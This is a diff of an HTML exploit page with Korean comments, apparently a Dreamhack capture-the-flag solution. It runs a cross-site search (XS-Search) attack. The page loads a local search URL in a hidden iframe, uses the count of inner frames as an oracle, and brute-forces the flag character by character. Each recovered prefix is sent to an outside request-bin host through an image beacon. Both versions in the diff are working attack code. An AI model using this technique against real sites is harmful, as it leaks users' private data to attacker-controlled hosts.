@@ -1,76 +1,79 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
   <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>XS-Search Exploit</title>
+    <meta charset="utf-8" />
+    <title>XS-Search Custom Exploit</title>
   </head>
   <body>
-    <iframe id="iframe"></iframe>
-    <img id="img" />
+    <!-- 검색 결과를 받아볼 창 -->
+    <iframe id="probe" style="display:none;"></iframe>
+    <!-- 로깅용 이미지 -->
+    <img id="beacon" style="display:none;" />
+
     <script>
-      const iframe = document.getElementById("iframe");
-      const img = document.getElementById("img");
+      const HEX_SET = "0123456789abcdef}";
+      let flagPrefix = "DH{"; // 지금까지 알아낸 FLAG prefix
 
-      async function req(url) {
-        // 지정한 주소의 프레임을 만들어 띄운다.
-        return await new Promise((resolve, reject) => {
-          iframe.src = url;
+      const probeFrame = document.getElementById("probe");
+      const beaconImg = document.getElementById("beacon");
 
-          iframe.onload = () => {
-            // 그 안에 프레임이 있으면 검색 성공, 없으면 실패
+      // 주어진 URL을 iframe으로 로드하고, 내부에 frame이 있는지 여부를 Boolean으로 돌려줍니다.
+      function probeUrl(url) {
+        return new Promise((resolve) => {
+          const onLoad = () => {
             try {
-              if (iframe.contentWindow.frames.length != 0) return resolve();
-              else return reject();
+              // cross-origin이어도 frame 개수(length)는 읽을 수 있습니다.
+              const innerFrames = probeFrame.contentWindow.frames.length;
+              resolve(innerFrames > 0);
             } catch (e) {
-              // 뭔가 예외가 나면 실패로 취급
-              return reject();
+              // 뭔가 예외가 나면 "검색 실패"로 취급
+              resolve(false);
+            } finally {
+              probeFrame.removeEventListener("load", onLoad);
             }
           };
+
+          probeFrame.addEventListener("load", onLoad);
+          probeFrame.src = url;
         });
       }
 
-      async function search(query) {
-        // 요청을 보내고 그 결과 확인하기
-        // ★ 답지와 최대한 동일하게: localhost 사용, 인코딩 안 함
-        try {
-          await req(`http://localhost:8000/search?query=${query}`);
-          return true;
-        } catch (e) {
-          return false;
-        }
+      // query가 FLAG에 부분 문자열로 포함되어 있으면 true, 아니면 false
+      async function isInSecret(query) {
+        const searchUrl =
+          "http://127.0.0.1:8000/search?query=" + encodeURIComponent(query);
+        return await probeUrl(searchUrl);
       }
 
-      async function exploit() {
-        let chars = "0123456789abcdef}";
-        let secret = "DH{"; // 플래그 형식. 현재까지 찾은 것들을 계속 이어붙인다.
+      // 한 글자 찾을 때마다 로거로 쏘기
+      function reportProgress(prefix) {
+        beaconImg.src =
+          "https://qdihqcw.request.dreamhack.games/log?secret=" +
+          encodeURIComponent(prefix);
+      }
 
-        while (!secret.includes("}")) {
-          // 플래그의 마지막 글자까지 나오면 종료
-          for (let c of chars) {
-            const candidate = secret + c;
+      async function runExploit() {
+        // '}' 나올 때까지 글자 하나씩 붙여 나간다.
+        while (!flagPrefix.includes("}")) {
+          for (const ch of HEX_SET) {
+            const candidate = flagPrefix + ch;
 
-            if (await search(candidate)) {
-              secret += c;
-
-              // 한 글자 검색이 성공할 때마다 Request Bin으로 전송
-              img.src =
-                "https://mcaoeux.request.dreamhack.games/" +
-                encodeURIComponent(secret);
-
-              console.log("FOUND:", secret);
+            const hit = await isInSecret(candidate);
+            if (hit) {
+              flagPrefix = candidate;
+              reportProgress(flagPrefix);
+              console.log("[+] extended:", flagPrefix);
               break;
             }
           }
         }
 
-        // 마지막으로 한 번 더 전체 FLAG 전송
-        img.src =
-          "https://mcaoeux.request.dreamhack.games/final_" +
-          encodeURIComponent(secret);
+        // 마지막으로 한 번 더 최종 FLAG 전송
+        reportProgress("FINAL_" + flagPrefix);
+        console.log("[*] done, flag =", flagPrefix);
       }
 
-      exploit();
+      runExploit();
     </script>
   </body>
 </html>
